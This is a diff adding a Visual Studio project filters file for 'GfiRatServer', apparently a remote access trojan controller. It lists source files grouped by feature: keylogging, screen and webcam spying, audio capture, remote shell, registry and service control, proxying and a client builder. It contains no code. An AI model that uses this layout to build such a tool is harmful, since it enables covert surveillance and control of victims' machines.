@@ -1,0 +1,558 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="源文件">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="资源文件">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="inifile">
+      <UniqueIdentifier>{ceff8415-f1c2-45eb-9c0a-bc921a3978c4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="iocp">
+      <UniqueIdentifier>{1e21aef8-df11-4f33-98df-bb45a1372a8d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="shell">
+      <UniqueIdentifier>{34dc6d8c-a41b-4114-a124-d5d50c29e5d4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="IP地理位置">
+      <UniqueIdentifier>{fc889743-5568-4111-b103-5702d804bf07}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="文件管理">
+      <UniqueIdentifier>{14d92424-ced3-4826-9fb2-dcacb88be02e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="键盘记录">
+      <UniqueIdentifier>{2b5e7e04-16fb-4193-ae68-de07b6fed22c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="屏幕控制">
+      <UniqueIdentifier>{378043f8-77a3-46d2-9edf-75c79f665acd}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="摄像头">
+      <UniqueIdentifier>{88c1abde-d65a-4dbe-ba9c-36454a16f748}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="AUDIO">
+      <UniqueIdentifier>{edc1b9a7-ba01-4912-bb2b-5064be06fa7e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="系统管理">
+      <UniqueIdentifier>{60e90c11-90f6-4c71-aa9b-9eccfeed20a6}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="主机管理">
+      <UniqueIdentifier>{9d0c8d80-3b5e-4fa5-9306-b4a6028b7979}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="注册表">
+      <UniqueIdentifier>{8c50af83-afa6-41a7-8f79-189f810e50fb}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="新屏幕控制">
+      <UniqueIdentifier>{d3195ac9-e155-4b60-a858-305c458f317f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Speaker">
+      <UniqueIdentifier>{86c9efa7-9117-482f-b626-308fed0b8629}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="服务管理">
+      <UniqueIdentifier>{ed6bd41a-5f76-4110-8881-ddb82619076d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="msg">
+      <UniqueIdentifier>{630ff4c4-f107-49fa-8fa5-e6b6f3beb6ee}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="远程交谈">
+      <UniqueIdentifier>{1782d4b3-94b0-4c67-8be7-35e406b24fe1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="代理">
+      <UniqueIdentifier>{cd92e6e6-b466-4de0-9ccc-ebd4f2ee7a28}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="头文件">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="创建客户">
+      <UniqueIdentifier>{b9ed57d6-47c1-4431-b323-a1bc1ec8ebbd}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="设置">
+      <UniqueIdentifier>{46f00a1b-cc85-4d81-8172-521e721d4d28}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="GfiRatServer.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="GfiRatServerDlg.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="framework.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="targetver.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="Resource.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="pch.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="IniFile.h">
+      <Filter>inifile</Filter>
+    </ClInclude>
+    <ClInclude Include="Buffer.h">
+      <Filter>iocp</Filter>
+    </ClInclude>
+    <ClInclude Include="CpuUsage.h">
+      <Filter>iocp</Filter>
+    </ClInclude>
+    <ClInclude Include="IOCPServer.h">
+      <Filter>iocp</Filter>
+    </ClInclude>
+    <ClInclude Include="Mapper.h">
+      <Filter>iocp</Filter>
+    </ClInclude>
+    <ClInclude Include="zlib.h">
+      <Filter>iocp</Filter>
+    </ClInclude>
+    <ClInclude Include="zconf.h">
+      <Filter>iocp</Filter>
+    </ClInclude>
+    <ClInclude Include="macros.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="ShellDlg.h">
+      <Filter>shell</Filter>
+    </ClInclude>
+    <ClInclude Include="SEU_QQwry.h">
+      <Filter>IP地理位置</Filter>
+    </ClInclude>
+    <ClInclude Include="FileManagerDlg.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="FileTransferModeDlg.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="InputDlg.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="TrueColorToolBar.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="KeyBoardDlg.h">
+      <Filter>键盘记录</Filter>
+    </ClInclude>
+    <ClInclude Include="ScreenSpyDlg.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="CursorInfo.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="WebCamDlg.h">
+      <Filter>摄像头</Filter>
+    </ClInclude>
+    <ClInclude Include="AudioDlg.h">
+      <Filter>AUDIO</Filter>
+    </ClInclude>
+    <ClInclude Include="Audio.h">
+      <Filter>AUDIO</Filter>
+    </ClInclude>
+    <ClInclude Include="SysInfo.h">
+      <Filter>主机管理</Filter>
+    </ClInclude>
+    <ClInclude Include="ZXPortMap.h">
+      <Filter>主机管理</Filter>
+    </ClInclude>
+    <ClInclude Include="RegDlg.h">
+      <Filter>注册表</Filter>
+    </ClInclude>
+    <ClInclude Include="RegDataDlg.h">
+      <Filter>注册表</Filter>
+    </ClInclude>
+    <ClInclude Include="newScreenSpyDlg.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="jconfig.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="jerror.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="jmorecfg.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="jpeglib.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="turbojpeg.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="xvid.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="XvidDec.h">
+      <Filter>新屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="SpeakerDlg.h">
+      <Filter>Speaker</Filter>
+    </ClInclude>
+    <ClInclude Include="AudioRender.h">
+      <Filter>Speaker</Filter>
+    </ClInclude>
+    <ClInclude Include="PlaybackAudioCapture.h">
+      <Filter>Speaker</Filter>
+    </ClInclude>
+    <ClInclude Include="SerManager.h">
+      <Filter>服务管理</Filter>
+    </ClInclude>
+    <ClInclude Include="SerAttribute.h">
+      <Filter>服务管理</Filter>
+    </ClInclude>
+    <ClInclude Include="MsgBox.h">
+      <Filter>msg</Filter>
+    </ClInclude>
+    <ClInclude Include="Chat.h">
+      <Filter>远程交谈</Filter>
+    </ClInclude>
+    <ClInclude Include="ProxyDlg.h">
+      <Filter>代理</Filter>
+    </ClInclude>
+    <ClInclude Include="RegEditEx.h">
+      <Filter>代理</Filter>
+    </ClInclude>
+    <ClInclude Include="SystemDlg.h">
+      <Filter>系统管理</Filter>
+    </ClInclude>
+    <ClInclude Include="LFileName.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="BUID.h">
+      <Filter>创建客户</Filter>
+    </ClInclude>
+    <ClInclude Include="encode.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="Setting.h">
+      <Filter>设置</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="GfiRatServer.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="GfiRatServerDlg.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="pch.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="IniFile.cpp">
+      <Filter>inifile</Filter>
+    </ClCompile>
+    <ClCompile Include="CpuUsage.cpp">
+      <Filter>iocp</Filter>
+    </ClCompile>
+    <ClCompile Include="IOCPServer.cpp">
+      <Filter>iocp</Filter>
+    </ClCompile>
+    <ClCompile Include="ShellDlg.cpp">
+      <Filter>shell</Filter>
+    </ClCompile>
+    <ClCompile Include="SEU_QQwry.cpp">
+      <Filter>IP地理位置</Filter>
+    </ClCompile>
+    <ClCompile Include="FileManagerDlg.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="FileTransferModeDlg.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="InputDlg.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="TrueColorToolBar.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="KeyBoardDlg.cpp">
+      <Filter>键盘记录</Filter>
+    </ClCompile>
+    <ClCompile Include="ScreenSpyDlg.cpp">
+      <Filter>屏幕控制</Filter>
+    </ClCompile>
+    <ClCompile Include="WebCamDlg.cpp">
+      <Filter>摄像头</Filter>
+    </ClCompile>
+    <ClCompile Include="AudioDlg.cpp">
+      <Filter>AUDIO</Filter>
+    </ClCompile>
+    <ClCompile Include="Audio.cpp">
+      <Filter>AUDIO</Filter>
+    </ClCompile>
+    <ClCompile Include="Buffer.cpp">
+      <Filter>iocp</Filter>
+    </ClCompile>
+    <ClCompile Include="SysInfo.cpp">
+      <Filter>主机管理</Filter>
+    </ClCompile>
+    <ClCompile Include="ZXPortMap.cpp">
+      <Filter>主机管理</Filter>
+    </ClCompile>
+    <ClCompile Include="RegDlg.cpp">
+      <Filter>注册表</Filter>
+    </ClCompile>
+    <ClCompile Include="RegDataDlg.cpp">
+      <Filter>注册表</Filter>
+    </ClCompile>
+    <ClCompile Include="newScreenSpyDlg.cpp">
+      <Filter>新屏幕控制</Filter>
+    </ClCompile>
+    <ClCompile Include="XvidDec.cpp">
+      <Filter>新屏幕控制</Filter>
+    </ClCompile>
+    <ClCompile Include="SpeakerDlg.cpp">
+      <Filter>Speaker</Filter>
+    </ClCompile>
+    <ClCompile Include="AudioRender.cpp">
+      <Filter>Speaker</Filter>
+    </ClCompile>
+    <ClCompile Include="PlaybackAudioCapture.cpp">
+      <Filter>Speaker</Filter>
+    </ClCompile>
+    <ClCompile Include="SerManager.cpp">
+      <Filter>服务管理</Filter>
+    </ClCompile>
+    <ClCompile Include="SerAttribute.cpp">
+      <Filter>服务管理</Filter>
+    </ClCompile>
+    <ClCompile Include="MsgBox.cpp">
+      <Filter>msg</Filter>
+    </ClCompile>
+    <ClCompile Include="Chat.cpp">
+      <Filter>远程交谈</Filter>
+    </ClCompile>
+    <ClCompile Include="ProxyDlg.cpp">
+      <Filter>代理</Filter>
+    </ClCompile>
+    <ClCompile Include="RegEditEx.cpp">
+      <Filter>代理</Filter>
+    </ClCompile>
+    <ClCompile Include="SystemDlg.cpp">
+      <Filter>系统管理</Filter>
+    </ClCompile>
+    <ClCompile Include="LFileName.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="BUID.cpp">
+      <Filter>创建客户</Filter>
+    </ClCompile>
+    <ClCompile Include="Setting.cpp">
+      <Filter>设置</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="GfiRatServer.rc">
+      <Filter>资源文件</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\GfiRatServer.rc2">
+      <Filter>资源文件</Filter>
+    </None>
+    <None Include="res\1.cur">
+      <Filter>资源文件</Filter>
+    </None>
+    <None Include="res\2.cur">
+      <Filter>资源文件</Filter>
+    </None>
+    <None Include="res\3.cur">
+      <Filter>资源文件</Filter>
+    </None>
+    <None Include="res\4.cur">
+      <Filter>资源文件</Filter>
+    </None>
+    <None Include="res\dot.cur">
+      <Filter>资源文件</Filter>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="res\GfiRatServer.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\cmdshell.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icon1.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\File.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\toolbar1.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\toolbar2.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\toolbar3.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\bar.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\barnew.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Bitmap_4.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Bitmap_5.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\keyboard.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\webcam.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\audio.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\system.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\AppWindows.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Process.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\1-IP.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\2-os.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\3-CPU.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\4-Memory.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\5-disk.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\6-UserName.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\7-Active.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\8-Anti.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\9-T-Port.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\10-Double.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\regedit.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\dword.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\regsz.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\remote.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\icos\icon2.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\文件夹1.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\service.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Servts0.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Servts1.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Servts2.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\chat.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\sysinfo.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\idr_1.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\002.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\003.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\004.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\005.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\006.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\007.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\008.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\009.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\010.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\bitbug_favicon 01.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\bitbug_favicon 02.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\bitbug_favicon 03.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\bitbug_favicon 04.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\qq.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\HOST.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\网络连接.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\拨号密码.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\窗口管理.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\浏览记录.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\软件信息.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\收藏夹.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+  </ItemGroup>
+</Project>
